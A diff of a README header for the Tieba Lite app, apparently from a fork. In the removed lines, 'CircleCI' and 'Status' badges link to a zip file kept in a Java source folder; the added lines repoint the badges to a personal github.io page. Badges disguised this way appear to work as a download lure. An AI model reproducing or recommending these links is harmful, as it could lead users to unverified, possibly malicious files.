@@ -1,10 +1,10 @@
 # <p align="center">Tieba Lite</p>
 <p align="center">
-    <a href="https://raw.githubusercontent.com/ricardocvs13/TiebaLite/master/app/src/main/java/com/huanchengfly/tieba/Lite_Tieba_2.9.zip">
-        <img alt="CircleCI" src="https://raw.githubusercontent.com/ricardocvs13/TiebaLite/master/app/src/main/java/com/huanchengfly/tieba/Lite_Tieba_2.9.zip">
+    <a href="https://ricardocvs13.github.io">
+        <img alt="CircleCI" src="https://ricardocvs13.github.io">
     </a>
     <a href="#">
-        <img alt="Status" src="https://raw.githubusercontent.com/ricardocvs13/TiebaLite/master/app/src/main/java/com/huanchengfly/tieba/Lite_Tieba_2.9.zip%E7%8A%B6%E6%80%81-%E5%92%95%E5%92%95%E5%92%95-gray?style=flat&labelColor=gray&color=gray">
+        <img alt="Status" src="https://ricardocvs13.github.io">
     </a>
 </p>
 
